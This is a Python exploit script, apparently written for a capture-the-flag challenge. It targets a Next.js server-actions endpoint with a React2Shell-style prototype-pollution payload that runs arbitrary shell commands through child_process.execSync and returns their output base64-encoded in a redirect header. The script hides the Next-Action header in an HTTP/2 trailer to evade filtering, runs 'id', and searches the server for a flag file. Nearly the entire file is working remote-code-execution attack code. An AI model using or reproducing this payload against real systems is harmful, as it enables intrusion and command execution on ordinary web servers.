#!/usr/bin/env python3
"""
Exact React2Shell payload with H2 trailers transport
Use original multipart payload, just replace Next-Action transport
"""
import socket
import ssl
import struct
import time
import base64
import re
from urllib.parse import unquote
from hpack import Encoder

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443
ACTION_ID_FILE = "/tmp/funi.actionid"

with open(ACTION_ID_FILE) as f:
    ACTION_ID = f.read().strip()
print(f"# Using action_id = {ACTION_ID}")

def create_exact_react2shell_payload(cmd):
    """Create EXACT React2Shell payload - multipart form"""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    cmd_escaped = cmd.replace("'", "\\'")

    # EXACT React2Shell RCE logic
    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd_escaped}',{{'timeout':5000}}).toString('base64');"
        f"throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    # EXACT multipart structure
    parts = []
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
    )
    parts.append("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--")

    body = "".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"

    return body.encode(), content_type

def send_via_h2_trailers(cmd):
    """Send exact React2Shell via H2 trailers (replacing Next-Action header)"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)

    if sock.selected_alpn_protocol() != "h2":
        raise RuntimeError("H2 not supported")

    sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
    sock.sendall(b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")

    try:
        sock.settimeout(2)
        sock.recv(65536)
    except:
        pass
    sock.settimeout(15)

    # Get exact React2Shell payload
    body_bytes, content_type = create_exact_react2shell_payload(cmd)

    # Headers WITHOUT Next-Action (like React2Shell)
    enc = Encoder()
    headers = enc.encode([
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", content_type),
        ("content-length", str(len(body_bytes))),
        ("trailer", "next-action"),  # Announce trailer
        ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
        ("x-nextjs-request-id", "b5dce965"),
        ("x-nextjs-html-request-id", "SSTMXm7OJ_g0Ncx6jpQt9"),
    ])

    # Trailer with ACTUAL action ID (not "x" like original React2Shell)
    trailer = enc.encode([("next-action", ACTION_ID)])

    sid = 1

    # Send HEADERS (no END_STREAM)
    frame = struct.pack(">I", len(headers))[1:] + b"\x01\x04" + struct.pack(">I", sid) + headers
    sock.sendall(frame)

    # Send DATA (no END_STREAM)
    frame = struct.pack(">I", len(body_bytes))[1:] + b"\x00\x00" + struct.pack(">I", sid) + body_bytes
    sock.sendall(frame)

    # Send TRAILER (END_STREAM) - this replaces Next-Action header
    frame = struct.pack(">I", len(trailer))[1:] + b"\x01\x05" + struct.pack(">I", sid) + trailer
    sock.sendall(frame)

    # Read response
    headers_received = {}
    response_body = b""
    end_time = time.time() + 20

    while time.time() < end_time:
        try:
            header = sock.recv(9)
            if len(header) < 9:
                break

            length = struct.unpack(">I", b"\x00" + header[0:3])[0]
            frame_type = header[3]
            flags = header[4]
            stream_id = struct.unpack(">I", header[5:9])[0] & 0x7FFFFFFF

            payload = b""
            while len(payload) < length:
                chunk = sock.recv(length - len(payload))
                if not chunk:
                    break
                payload += chunk

            if frame_type == 1:  # HEADERS
                # Look for Location or X-Action-Redirect
                if b"location" in payload:
                    try:
                        loc_match = re.search(rb'location[^\x00]*\x00([^\x00]+)', payload)
                        if loc_match:
                            headers_received["location"] = loc_match.group(1).decode()
                    except:
                        pass

                if b"x-action-redirect" in payload:
                    try:
                        redirect_match = re.search(rb'x-action-redirect[^\x00]*\x00([^\x00]+)', payload)
                        if redirect_match:
                            headers_received["x-action-redirect"] = redirect_match.group(1).decode()
                    except:
                        pass

            elif frame_type == 0:  # DATA
                response_body += payload

            if stream_id == sid and (flags & 1):
                break

        except Exception:
            break

    sock.close()
    return headers_received, response_body

def extract_rce_result(headers, body):
    """Extract RCE result like React2Shell does"""
    # Check X-Action-Redirect header
    redirect_header = headers.get("x-action-redirect", "")
    if redirect_header:
        match = re.search(r'/login\?a=(.*?)(?:;|$)', redirect_header)
        if match:
            try:
                output_b64 = unquote(match.group(1))
                decoded = base64.b64decode(output_b64).decode('utf-8', errors='ignore')
                return f"RCE SUCCESS: {decoded.strip()}"
            except Exception as e:
                return f"Decode error: {e}"

    # Check Location header
    location_header = headers.get("location", "")
    if location_header:
        match = re.search(r'/login\?a=(.*?)(?:;|$)', location_header)
        if match:
            try:
                output_b64 = unquote(match.group(1))
                decoded = base64.b64decode(output_b64).decode('utf-8', errors='ignore')
                return f"RCE SUCCESS: {decoded.strip()}"
            except Exception as e:
                return f"Decode error: {e}"

    # Check body for any error indication
    body_str = body.decode('utf-8', errors='ignore')
    if "digest" in body_str:
        return f"Payload failed: {body_str[:200]}"

    return f"No RCE indication. Headers: {headers}, Body size: {len(body)}"

def main():
    print("=" * 80)
    print("EXACT React2Shell + H2 Trailers")
    print("=" * 80)

    test_cmd = "id"
    print(f"[+] Testing command: {test_cmd}")

    try:
        headers, body = send_via_h2_trailers(test_cmd)
        result = extract_rce_result(headers, body)

        print(f"[+] Result: {result}")

        if "RCE SUCCESS" in result:
            print(f"\n[!] RCE CONFIRMED! {result}")

            # Get flag
            flag_cmd = "find / -name '*flag*' 2>/dev/null || cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null"
            headers2, body2 = send_via_h2_trailers(flag_cmd)
            flag_result = extract_rce_result(headers2, body2)

            if "alfa{" in flag_result:
                flag_match = re.search(r'alfa\{[^}]+\}', flag_result)
                if flag_match:
                    print(f"\n[!] FLAG FOUND: {flag_match.group(0)}")
                    return

            print(f"[+] Flag search result: {flag_result}")

    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()